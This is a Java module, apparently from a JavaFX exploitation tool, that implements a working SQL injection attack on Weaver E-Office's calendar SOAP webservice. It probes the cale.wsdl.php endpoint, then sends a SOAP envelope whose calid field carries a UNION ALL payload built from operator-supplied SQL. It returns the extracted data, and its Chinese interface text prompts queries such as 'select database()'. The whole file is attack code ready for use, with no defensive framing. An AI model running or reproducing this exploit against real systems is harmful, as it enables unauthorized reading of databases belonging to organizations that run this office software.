package exp.oa.weaveroa.eoffice;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import org.apache.commons.lang3.StringEscapeUtils;
import utils.HttpTools;
import utils.Response;
import utils.getIndexOf;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class weaver_eo_calewsdl_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {

        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            Response get_res = HttpTools.get(url + "/webservice/calendar/cale.wsdl.php" , head, "utf-8");
            if (get_res.getCode() == 200 && get_res.getText().contains("CaleServicewsdl")) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ weaver_eo_calewsdl_sqli ]");
                    textArea.appendText("\n sql注入类型为联合注入，CMD处输入sql语法查询");
                    textArea.appendText("\n 示例语法: select database()");
                    textArea.appendText("\n");
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    public String error_sqli(String url,String sql){
        try{
            HttpURLConnection connection = HttpTools.getCoon(url);
            connection.setRequestMethod("POST");
            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "text/xml; charset=UTF-8");
            connection.setRequestProperty("SOAPAction","urn:CaleServicewsdl#getPreNextCalendar");
            String xmlData = "<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:urn=\"urn:CaleServicewsdl\">\n" +
                    " <soapenv:Header/>\n" +
                    " <soapenv:Body>\n" +
                    " <urn:getPreNextCalendar soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n" +
                    "          <calid xsi:type=\"xsd:string\">gero et&apos; UNION ALL "+sql+",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#</calid>\n" +
                    "    <flag xsi:type=\"xsd:string\">sonoras imperio</flag>\n" +
                    "   </urn:getPreNextCalendar>\n" +
                    " </soapenv:Body>\n" +
                    "</soapenv:Envelope>";
            DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
            outputStream.writeBytes(xmlData);
            outputStream.flush();
            outputStream.close();

            int responseCode = connection.getResponseCode();

            BufferedReader reader;
            if (responseCode == HttpURLConnection.HTTP_OK) {
                reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            } else {
                reader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));
            }

            String line;
            StringBuilder response = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();
            System.out.println("Response Code: " + responseCode);
            connection.disconnect();
            return response.toString();

        }catch(Exception e) {
            e.printStackTrace();
            return null;
        }
    }


    private Boolean attcmd(String url, String sql,TextArea textArea, TextArea textArea_cmd) {
        String var1 = error_sqli(url+"/webservice/calendar/cale.wsdl.php",sql);
        String var2 = getIndexOf.getXMLStr(var1,"ns1:getPreNextCalendarResponse","return","docsid");
        if(var2 != null){
            String finalVar = var2;
            Platform.runLater(() -> {
                textArea.appendText("\n SQL语句: "+sql+" 执行成功");
                textArea_cmd.appendText("\n------------------注入结果----------------\n"+finalVar);
                textArea.appendText("\n");
            });

            return true;
        }else {
            Platform.runLater(() -> {
                textArea.appendText("\n SQL语句: "+sql+" 执行失败");
            });
            return false;
        }
    }
}
